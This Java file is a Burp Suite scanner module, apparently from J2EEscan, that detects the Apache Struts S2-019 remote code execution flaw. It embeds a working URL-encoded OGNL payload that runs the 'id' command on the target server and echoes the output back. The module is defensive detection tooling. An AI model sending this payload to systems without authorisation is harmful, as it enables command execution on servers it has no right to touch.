package burp.j2ee.issues.impl;

import burp.*;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;
import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class StrutsS2019 implements IModule {
    private static final String TITLE = "Struts S2-019 Remote Code Execution (Reflect)";
    private static final String DESCRIPTION = "J2EEscan identified Struts S2-019 Reflected RCE in the webpage"
            + "<b>References</b>:<br /><br />"
            + "http://struts.apache.org/docs/s2-019.html<br />"
            + "https://github.com/vulhub/vulhub/tree/master/struts2/s2-019<br />"
            + "https://github.com/ronoski/VulApps/tree/master/s/struts2/s2-019";

    private static final String REMEDY = "Upgrade to latest Apache Struts version";

    private static final List<Pattern> UID_REGEX = Arrays.asList(
            Pattern.compile("uid=[0-9]+.*gid=[0-9]+.*", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));

    private PrintWriter stderr;
    @Override
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        stderr = new PrintWriter(callbacks.getStderr(), true);
        List<IScanIssue> issues = new ArrayList<>();

        String payload_template = "?debug=command&expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27id%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29";
        IExtensionHelpers helpers = callbacks.getHelpers();

        IRequestInfo reqInfo = callbacks.getHelpers().analyzeRequest(baseRequestResponse);
        URL curURL = reqInfo.getUrl();

        String protocol = curURL.getProtocol();
        String host = curURL.getHost();
        int port = curURL.getPort();
        String path = curURL.getPath();

        try{
            URL newURL = new URL(protocol, host, port,  path + payload_template);
            byte[] newMessage = helpers.buildHttpRequest(newURL);
            IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),
                    newMessage);

            //stderr.println(newURL.toString()); //debug message
            String response = helpers.bytesToString(checkRequestResponse.getResponse());
            for (Pattern xincludeMatcher : UID_REGEX) {

                Matcher matcher = xincludeMatcher.matcher(response);

                if (matcher.find()) {
                    issues.add(new CustomScanIssue(
                            baseRequestResponse.getHttpService(),
                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                            checkRequestResponse,
                            TITLE,
                            DESCRIPTION,
                            REMEDY,
                            Risk.High,
                            Confidence.Firm
                    ));
                    return issues;
                }
            }

        }catch (MalformedURLException ex) {
            stderr.println("Error creating URL " + ex.getMessage());
        }

        return issues;
    }
}
